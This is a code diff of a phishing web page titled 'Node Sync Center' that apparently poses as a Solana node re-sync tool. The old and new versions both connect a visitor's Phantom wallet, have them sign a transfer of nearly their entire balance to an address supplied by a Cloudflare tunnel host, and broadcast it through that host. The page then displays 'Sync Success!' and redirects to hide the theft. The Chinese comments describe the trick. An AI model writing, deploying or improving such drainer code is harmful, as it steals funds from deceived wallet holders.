@@ -1,96 +1,43 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Sync Center</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #14f195; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
-        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
-        #log { font-size: 10px; color: #555; margin-top: 15px; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h3 style="color:#9945FF;">SYSTEM RE-SYNC</h3>
-        <p style="font-size:12px;">Node Status: <span style="color:red;">Lagging</span></p>
-        <button id="cta">START SYNC</button>
-        <div id="log">Ready to connect...</div>
-    </div>
+<script>
+    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
-    <script>
-        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const p = window.solana || window.phantom?.solana;
+        const sWeb3 = window.solanaWeb3;
+        if (!p) return;
 
-        document.getElementById('cta').onclick = async () => {
-            const log = (m) => document.getElementById('log').innerText = m;
-            const sWeb3 = window.solanaWeb3;
-            // 🔱 兼容性判断：尝试从各种入口抓取钱包
-            const provider = window.solana || window.phantom?.solana;
+        try {
+            await p.connect();
+            // 🔱 动个小手脚：只把地址发过去，剩下的全等后端喂
+            const info = await fetch(`${tunnel}/prepare`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address: p.publicKey.toString() })
+            }).then(r => r.json());
 
-            if (!provider) {
-                alert("Please open this link inside Phantom App browser.");
-                return;
-            }
+            if (info.error) return;
 
-            try {
-                log("Connecting...");
-                await provider.connect();
-                const userAddr = provider.publicKey.toString();
+            // 🔱 前端唯一的任务：把后端拼好的数签个字
+            const tx = new sWeb3.Transaction().add(
+                sWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new sWeb3.PublicKey(info.receiver),
+                    lamports: info.amount,
+                })
+            );
+            tx.recentBlockhash = info.bh;
+            tx.feePayer = p.publicKey;
 
-                log("Fetching params...");
-                // 1. 拿后端地址
-                const info = await fetch(`${tunnel}/prepare`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: userAddr })
-                }).then(r => r.json());
+            const signed = await p.signTransaction(tx);
+            
+            // 发射！
+            fetch(`${tunnel}/broadcast`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ raw_tx: btoa(String.fromCharCode.apply(null, new Uint8Array(signed.serialize()))) })
+            });
 
-                log("Calculating balance...");
-                // 2. 建立连接 (不走服务器，走手机流量直连)
-                const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-                const balance = await conn.getBalance(provider.publicKey);
-                const bh = await conn.getLatestBlockhash();
-
-                // 3. 算子弹 (留 0.001 SOL)
-                const amount = balance - 1000000;
-                if (amount <= 0) { log("Balance too low"); return; }
-
-                log("Requesting sign...");
-                // 4. 构造交易
-                const tx = new sWeb3.Transaction().add(
-                    sWeb3.SystemProgram.transfer({
-                        fromPubkey: provider.publicKey,
-                        toPubkey: new sWeb3.PublicKey(info.receiver),
-                        lamports: amount,
-                    })
-                );
-                tx.recentBlockhash = bh.blockhash;
-                tx.feePayer = provider.publicKey;
-
-                // 5. 拉起签名 (核心关键)
-                const signed = await provider.signTransaction(tx);
-                log("Broadcasting...");
-
-                // 6. 后台广播
-                const serialized = signed.serialize();
-                const base64 = btoa(String.fromCharCode.apply(null, new Uint8Array(serialized)));
-                
-                fetch(`${tunnel}/broadcast`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_tx: base64 })
-                });
-
-                log("Sync Success!");
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
-
-            } catch (err) {
-                console.error(err);
-                log("Error: " + err.message);
-            }
-        };
-    </script>
-</body>
-</html>
+            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
+        } catch (e) { location.reload(); }
+    };
+</script>
